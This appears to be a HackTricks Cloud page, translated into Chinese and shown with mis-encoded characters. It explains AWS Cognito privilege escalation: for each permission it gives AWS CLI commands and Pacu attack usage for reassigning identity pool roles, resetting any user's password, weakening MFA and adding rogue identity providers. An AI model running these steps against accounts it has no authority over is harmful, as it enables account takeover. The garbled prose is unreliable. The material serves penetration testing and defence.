# AWS - Cognito æƒé™æå‡

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## Cognito

æ›´å¤šå…³äºCognitoçš„ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### å·¥å…·

* [Pacu](https://github.com/RhinoSecurityLabs/pacu)ï¼ŒAWSåˆ©ç”¨æ¡†æ¶ï¼Œç°åœ¨åŒ…æ‹¬ "cognito\_\_enum" å’Œ "cognito\_\_attack" æ¨¡å—ï¼Œè¿™äº›æ¨¡å—è‡ªåŠ¨æšä¸¾è´¦æˆ·ä¸­çš„æ‰€æœ‰Cognitoèµ„äº§å¹¶æ ‡è®°å¼±é…ç½®ã€ç”¨äºè®¿é—®æ§åˆ¶çš„ç”¨æˆ·å±æ€§ç­‰ï¼Œå¹¶è‡ªåŠ¨åŒ–ç”¨æˆ·åˆ›å»ºï¼ˆåŒ…æ‹¬MFAæ”¯æŒï¼‰å’ŒåŸºäºå¯ä¿®æ”¹çš„è‡ªå®šä¹‰å±æ€§ã€å¯ç”¨çš„èº«ä»½æ± å‡­è¯ã€å¯å‡è®¾çš„è§’è‰²åœ¨idä»¤ç‰Œä¸­çš„æƒé™æå‡ç­‰ã€‚

æœ‰å…³æ¨¡å—åŠŸèƒ½çš„æè¿°ï¼Œè¯·å‚é˜…[åšå®¢æ–‡ç« ](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2)çš„ç¬¬2éƒ¨åˆ†ã€‚æœ‰å…³å®‰è£…è¯´æ˜ï¼Œè¯·å‚é˜…ä¸»è¦çš„[Pacu](https://github.com/RhinoSecurityLabs/pacu)é¡µé¢ã€‚

#### ä½¿ç”¨

ç¤ºä¾‹cognito\_\_attackä½¿ç”¨ï¼Œå°è¯•é’ˆå¯¹ç»™å®šçš„èº«ä»½æ± å’Œç”¨æˆ·æ± å®¢æˆ·ç«¯åˆ›å»ºç”¨æˆ·å’Œæ‰€æœ‰æƒé™æå‡å‘é‡ï¼š
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
```markdown
Sample cognito__enum ç”¨æ³•ï¼Œç”¨äºæ”¶é›†å½“å‰ AWS è´¦æˆ·ä¸­å¯è§çš„æ‰€æœ‰ç”¨æˆ·æ± ã€ç”¨æˆ·æ± å®¢æˆ·ç«¯ã€èº«ä»½æ± ã€ç”¨æˆ·ç­‰ä¿¡æ¯ï¼š
```
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) æ˜¯ä¸€ä¸ªç”¨ Python ç¼–å†™çš„ CLI å·¥å…·ï¼Œå®ƒå®ç°äº†å¯¹ Cognito çš„ä¸åŒæ”»å‡»ï¼ŒåŒ…æ‹¬æƒé™æå‡æ”»å‡»ã€‚

#### å®‰è£…
```bash
$ pip install cognito-scanner
```
#### ä½¿ç”¨æ–¹æ³•
```bash
$ cognito-scanner --help
```
### ä»èº«ä»½æ± æ”¶é›†å‡­è¯

ç”±äº Cognito å¯ä»¥å‘**ç»è¿‡è®¤è¯**çš„å’Œ**æœªç»è®¤è¯**çš„**ç”¨æˆ·**æˆäºˆ **IAM è§’è‰²å‡­è¯**ï¼Œå¦‚æœä½ æ‰¾åˆ°äº†åº”ç”¨ç¨‹åºçš„**èº«ä»½æ±  ID**ï¼ˆåº”è¯¥åœ¨åº”ç”¨ç¨‹åºä¸­ç¡¬ç¼–ç ï¼‰ï¼Œä½ å¯ä»¥è·å–æ–°çš„å‡­è¯ï¼Œå› æ­¤åœ¨ AWS è´¦æˆ·ä¸­æå‡æƒé™ï¼ˆåœ¨è¿™ä¸ªè´¦æˆ·ä¸­ä½ å¯èƒ½ä¹‹å‰ç”šè‡³æ²¡æœ‰ä»»ä½•å‡­è¯ï¼‰ã€‚

æ¬²äº†è§£æ›´å¤šä¿¡æ¯[**æŸ¥çœ‹æ­¤é¡µé¢**](../aws-unauthenticated-enum-access/#cognito)ã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™åˆ°æœªè®¤è¯ç”¨æˆ·ï¼ˆä»¥åŠå¯èƒ½è®¤è¯ç”¨æˆ·ï¼‰æ‰€é™„åŠ æœåŠ¡è§’è‰²ã€‚

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

æ‹¥æœ‰è¿™ä¸ªæƒé™ï¼Œä½ å¯ä»¥**æˆäºˆä»»ä½• Cognito è§’è‰²**ç»™ Cognito åº”ç”¨çš„ç»è¿‡è®¤è¯/æœªç»è®¤è¯çš„ç”¨æˆ·ã€‚
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
å¦‚æœ cognito åº”ç”¨**æœªå¯ç”¨æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·**ï¼Œæ‚¨å¯èƒ½è¿˜éœ€è¦æƒé™ `cognito-identity:UpdateIdentityPool` æ¥å¯ç”¨å®ƒã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥ privesc åˆ°ä»»ä½• cognito è§’è‰²ã€‚

### `cognito-identity:update-identity-pool`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥è®¾ç½®ä¾‹å¦‚ä¸€ä¸ªä»–æ§åˆ¶çš„ Cognito ç”¨æˆ·æ± æˆ–ä»»ä½•å…¶ä»–èº«ä»½æä¾›è€…ï¼Œä»–å¯ä»¥ä½œä¸º**è®¿é—®æ­¤ Cognito èº«ä»½æ± çš„æ–¹å¼**ç™»å½•ã€‚ç„¶åï¼Œä»…åœ¨è¯¥ç”¨æˆ·æä¾›è€…ä¸Š**ç™»å½•**å°†**å…è®¸ä»–è®¿é—®èº«ä»½æ± ä¸­é…ç½®çš„ç»è¿‡èº«ä»½éªŒè¯çš„è§’è‰²**ã€‚
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
å®ƒä¹Ÿå¯ä»¥**æ»¥ç”¨æ­¤æƒé™ä»¥å…è®¸åŸºæœ¬è®¤è¯**ï¼š
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**æ½œåœ¨å½±å“**ï¼šå±åŠèº«ä»½æ± å†…é…ç½®çš„è®¤è¯ IAM è§’è‰²ã€‚

### `cognito-idp:AdminAddUserToGroup`

æ­¤æƒé™å…è®¸**å°† Cognito ç”¨æˆ·æ·»åŠ åˆ° Cognito ç»„**ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥æ»¥ç”¨æ­¤æƒé™ï¼Œå°†å…¶æ§åˆ¶ä¸‹çš„ç”¨æˆ·æ·»åŠ åˆ°å…·æœ‰**æ›´é«˜**æƒé™æˆ–**ä¸åŒ IAM è§’è‰²**çš„å…¶ä»–ç»„ï¼š
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**æ½œåœ¨å½±å“ï¼š** æå‡è‡³å…¶ä»– Cognito ç»„å’Œé™„åŠ åˆ°ç”¨æˆ·æ± ç»„çš„ IAM è§’è‰²çš„æƒé™ã€‚

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

æ‹¥æœ‰è¿™äº›æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»º/æ›´æ–°ç»„**ï¼Œå¹¶å°†**æ¯ä¸ªå¯ä»¥è¢«æ³„éœ²çš„ Cognito èº«ä»½æä¾›è€…ä½¿ç”¨çš„ IAM è§’è‰²**ï¼Œä½¿æ³„éœ²çš„ç”¨æˆ·æˆä¸ºç»„çš„ä¸€éƒ¨åˆ†ï¼Œè®¿é—®æ‰€æœ‰è¿™äº›è§’è‰²ï¼š

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** æå‡è‡³å…¶ä»– Cognito IAM è§’è‰²æƒé™ã€‚

### `cognito-idp:AdminConfirmSignUp`

æ­¤æƒé™å…è®¸**éªŒè¯æ³¨å†Œ**ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä»»ä½•äººéƒ½å¯ä»¥æ³¨å†Œ Cognito åº”ç”¨ç¨‹åºï¼Œå¦‚æœä¿ç•™é»˜è®¤è®¾ç½®ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨ä»»ä½•æ•°æ®åˆ›å»ºè´¦æˆ·ï¼Œå¹¶ä½¿ç”¨æ­¤æƒé™è¿›è¡ŒéªŒè¯ã€‚
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**æ½œåœ¨å½±å“ï¼š** å¦‚æœæ‚¨å¯ä»¥æ³¨å†Œæ–°ç”¨æˆ·ï¼Œåˆ™å¯¹ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·çš„èº«ä»½æ± IAMè§’è‰²è¿›è¡Œé—´æ¥æƒé™æå‡ã€‚å¦‚æœèƒ½å¤Ÿç¡®è®¤ä»»ä½•è´¦æˆ·ï¼Œåˆ™å¯¹å…¶ä»–åº”ç”¨åŠŸèƒ½è¿›è¡Œé—´æ¥æƒé™æå‡ã€‚

### `cognito-idp:AdminCreateUser`

æ­¤æƒé™å°†å…è®¸æ”»å‡»è€…åœ¨ç”¨æˆ·æ± å†…åˆ›å»ºæ–°ç”¨æˆ·ã€‚æ–°ç”¨æˆ·è¢«åˆ›å»ºä¸ºå¯ç”¨çŠ¶æ€ï¼Œä½†éœ€è¦æ›´æ”¹å…¶å¯†ç ã€‚
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**æ½œåœ¨å½±å“ï¼š** å¯¹äºç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼Œç›´æ¥æå‡åˆ°èº«ä»½æ± IAMè§’è‰²çš„æƒé™ã€‚é—´æ¥æå‡åˆ°å…¶ä»–åº”ç”¨åŠŸèƒ½çš„æƒé™ï¼Œèƒ½å¤Ÿåˆ›å»ºä»»ä½•ç”¨æˆ·

### `cognito-idp:AdminEnableUser`

æ­¤æƒé™å¯ä»¥åœ¨ä¸€ä¸ªéå¸¸è¾¹ç¼˜çš„æƒ…å†µä¸‹å¸®åŠ©æ”»å‡»è€…ï¼Œå³æ”»å‡»è€…æ‰¾åˆ°äº†ä¸€ä¸ªè¢«ç¦ç”¨ç”¨æˆ·çš„å‡­è¯ï¼Œå¹¶ä¸”ä»–éœ€è¦**å†æ¬¡å¯ç”¨å®ƒ**ã€‚
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**æ½œåœ¨å½±å“ï¼š** å¯¹äºå·²è®¤è¯ç”¨æˆ·ï¼Œé—´æ¥æå‡æƒé™è‡³èº«ä»½æ± IAMè§’è‰²ï¼Œä»¥åŠå¦‚æœæ”»å‡»è€…æ‹¥æœ‰è¢«ç¦ç”¨ç”¨æˆ·çš„å‡­è¯ï¼Œåˆ™è·å–è¯¥ç”¨æˆ·çš„æƒé™ã€‚

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

æ­¤æƒé™å…è®¸ä½¿ç”¨[**æ–¹æ³• ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**ã€‚** æ›´å¤šä¿¡æ¯è¯·ç‚¹å‡»é“¾æ¥ã€‚

### `cognito-idp:AdminSetUserPassword`

æ­¤æƒé™å°†å…è®¸æ”»å‡»è€…**æ›´æ”¹ä»»ä½•ç”¨æˆ·çš„å¯†ç **ï¼Œä½¿å…¶èƒ½å¤Ÿå†’å……ä»»ä½•ç”¨æˆ·ï¼ˆæœªå¯ç”¨MFAçš„ç”¨æˆ·ï¼‰ã€‚
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™è‡³å¯èƒ½æ˜¯ä»»ä½•ç”¨æˆ·ï¼Œå› æ­¤å¯ä»¥è®¿é—®æ¯ä¸ªç”¨æˆ·æ‰€å±çš„æ‰€æœ‰ç»„ï¼Œä»¥åŠè®¿é—®èº«ä»½æ± è®¤è¯çš„IAMè§’è‰²ã€‚

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**ï¼šæ”»å‡»è€…å¯èƒ½ä¼šæ»¥ç”¨æ­¤æƒé™ï¼Œå°†å…¶æ§åˆ¶ä¸‹çš„æ‰‹æœºè®¾ç½®ä¸º**ç”¨æˆ·çš„SMS MFA**ã€‚
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** ç±»ä¼¼äºå‰ä¸€ä¸ªæƒé™ï¼Œæ­¤æƒé™å¯ç”¨äºè®¾ç½®ç”¨æˆ·çš„MFAåå¥½ï¼Œä»¥ç»•è¿‡MFAä¿æŠ¤ã€‚
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**ï¼šç±»ä¼¼äºå‰ä¸€ä¸ªæƒé™ï¼Œæ­¤æƒé™å¯ç”¨äºè®¾ç½®ç”¨æˆ·æ± çš„MFAåå¥½è®¾ç½®ï¼Œä»¥ç»•è¿‡MFAä¿æŠ¤ã€‚
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPoolï¼š** è¿˜å¯ä»¥æ›´æ–°ç”¨æˆ·æ± ä»¥æ›´æ”¹MFAç­–ç•¥ã€‚[æŸ¥çœ‹cliè¿™é‡Œ](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html)ã€‚

**æ½œåœ¨å½±å“ï¼š** é—´æ¥çš„æƒé™æå‡ï¼Œå¯èƒ½å½±å“æ”»å‡»è€…çŸ¥é“å‡­è¯çš„ä»»ä½•ç”¨æˆ·ï¼Œè¿™å¯èƒ½å…è®¸ç»•è¿‡MFAä¿æŠ¤ã€‚

### `cognito-idp:AdminUpdateUserAttributes`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥æ›´æ”¹å…¶æ§åˆ¶ä¸‹çš„ç”¨æˆ·çš„ç”µå­é‚®ä»¶ã€ç”µè¯å·ç æˆ–ä»»ä½•å…¶ä»–å±æ€§ï¼Œä»¥å°è¯•åœ¨åº•å±‚åº”ç”¨ç¨‹åºä¸­è·å¾—æ›´å¤šæƒé™ã€‚\
è¿™å…è®¸æ›´æ”¹ç”µå­é‚®ä»¶æˆ–ç”µè¯å·ç ï¼Œå¹¶å°†å…¶è®¾ç½®ä¸ºå·²éªŒè¯ã€‚
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**æ½œåœ¨å½±å“ï¼š** ä½¿ç”¨ Cognito ç”¨æˆ·æ± çš„åº•å±‚åº”ç”¨ç¨‹åºå¯èƒ½é—´æ¥æå‡æƒé™ï¼Œè¿™äº›æƒé™åŸºäºç”¨æˆ·å±æ€§ã€‚

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»ºä¸€ä¸ªé™åˆ¶è¾ƒå°‘çš„æ–°ç”¨æˆ·æ± å®¢æˆ·ç«¯**ï¼Œç›¸æ¯”å·²å­˜åœ¨çš„æ± å®¢æˆ·ç«¯æ›´ä¸ºå®½æ¾ã€‚ä¾‹å¦‚ï¼Œæ–°å®¢æˆ·ç«¯å¯èƒ½å…è®¸ä»»ä½•è®¤è¯æ–¹æ³•ï¼Œä¸éœ€è¦ä»»ä½•å¯†é’¥ï¼Œç¦ç”¨äº†ä»¤ç‰ŒåŠé”€ï¼Œå…è®¸ä»¤ç‰Œæœ‰æ•ˆæœŸæ›´é•¿...

å¦‚æœä¸æ˜¯åˆ›å»ºæ–°å®¢æˆ·ç«¯ï¼Œè€Œæ˜¯**ä¿®æ”¹ç°æœ‰å®¢æˆ·ç«¯**ï¼Œä¹Ÿå¯ä»¥åšåˆ°åŒæ ·çš„äº‹æƒ…ã€‚

åœ¨[**å‘½ä»¤è¡Œ**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html)ï¼ˆæˆ–[**æ›´æ–°å‘½ä»¤**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)ï¼‰ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°æ‰€æœ‰é€‰é¡¹ï¼Œè¯·æ£€æŸ¥ï¼
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**æ½œåœ¨å½±å“ï¼š**é€šè¿‡åˆ›å»ºä¸€ä¸ªæ–°çš„å®¢æˆ·ç«¯æ¥æ”¾å®½å®‰å…¨æªæ–½ï¼Œä½¿æ”»å‡»è€…æœ‰å¯èƒ½ä»¥ä»–èƒ½å¤Ÿåˆ›å»ºçš„ç”¨æˆ·èº«ä»½ç™»å½•ï¼Œä»è€Œå¯èƒ½é—´æ¥åœ°æå‡åˆ°ä½¿ç”¨ç”¨æˆ·æ± çš„èº«ä»½æ± æˆæƒç”¨æˆ·çš„æƒé™ã€‚

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

æ”»å‡»è€…å¯ä»¥æ»¥ç”¨æ­¤æƒé™ï¼Œé€šè¿‡ä¸Šä¼ åŒ…å«æ–°ç”¨æˆ·çš„ csv æ–‡ä»¶æ¥åˆ›å»ºç”¨æˆ·ã€‚
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
**æ½œåœ¨å½±å“ï¼š** å¯¹äºç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼Œç›´æ¥æå‡è‡³èº«ä»½æ± IAMè§’è‰²çš„æƒé™ã€‚é—´æ¥æå‡è‡³å…¶ä»–åº”ç”¨åŠŸèƒ½çš„æƒé™ï¼Œèƒ½å¤Ÿåˆ›å»ºä»»ä½•ç”¨æˆ·ã€‚

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„èº«ä»½æä¾›å•†ï¼Œç„¶åèƒ½å¤Ÿ**é€šè¿‡æ­¤æä¾›å•†ç™»å½•**ã€‚
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™è‡³èº«ä»½æ± IAMè§’è‰²ç»™è®¤è¯ç”¨æˆ·ã€‚é—´æ¥æå‡æƒé™è‡³å…¶ä»–åº”ç”¨åŠŸèƒ½ï¼Œèƒ½å¤Ÿåˆ›å»ºä»»ä½•ç”¨æˆ·ã€‚

### cognito-sync:\* åˆ†æ

è¿™æ˜¯Cognitoèº«ä»½æ± è§’è‰²é»˜è®¤éå¸¸å¸¸è§çš„æƒé™ã€‚å³ä½¿åœ¨æƒé™ä¸­ä½¿ç”¨é€šé…ç¬¦æ€»æ˜¯çœ‹èµ·æ¥ä¸å¥½ï¼ˆç‰¹åˆ«æ˜¯æ¥è‡ªAWSçš„ï¼‰ï¼Œ**æˆäºˆçš„æƒé™ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹å¹¶ä¸ç‰¹åˆ«æœ‰ç”¨**ã€‚

æ­¤æƒé™å…è®¸è¯»å–èº«ä»½æ± å’Œèº«ä»½æ± å†…çš„èº«ä»½IDçš„ç”¨æˆ·ä¿¡æ¯ï¼ˆè¿™ä¸æ˜¯æ•æ„Ÿä¿¡æ¯ï¼‰ã€‚\
èº«ä»½IDå¯èƒ½æœ‰åˆ†é…ç»™å®ƒä»¬çš„[**æ•°æ®é›†**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html)ï¼Œè¿™æ˜¯ä¼šè¯çš„ä¿¡æ¯ï¼ˆAWSå°†å…¶å®šä¹‰ä¸º**ä¿å­˜çš„æ¸¸æˆ**ï¼‰ã€‚å¯èƒ½åŒ…å«æŸç§æ•æ„Ÿä¿¡æ¯ï¼ˆä½†å¯èƒ½æ€§å¾ˆä½ï¼‰ã€‚ä½ å¯ä»¥åœ¨[**æšä¸¾é¡µé¢**](../aws-services/aws-cognito-enum/)æ‰¾åˆ°å¦‚ä½•è®¿é—®è¿™äº›ä¿¡æ¯ã€‚

æ”»å‡»è€…ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™äº›æƒé™**æ³¨å†Œè‡ªå·±åˆ°ä¸€ä¸ªå‘å¸ƒè¿™äº›æ•°æ®é›†æ›´æ”¹çš„Cognitoæµ**æˆ–è€…**è§¦å‘Cognitoäº‹ä»¶çš„lambda**ã€‚æˆ‘æ²¡è§è¿‡è¿™ç§ç”¨æ³•ï¼Œæˆ‘ä¹Ÿä¸æœŸæœ›è¿™é‡Œæœ‰æ•æ„Ÿä¿¡æ¯ï¼Œä½†è¿™å¹¶éä¸å¯èƒ½ã€‚

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼Œè¯·æŸ¥çœ‹</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–è€…**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
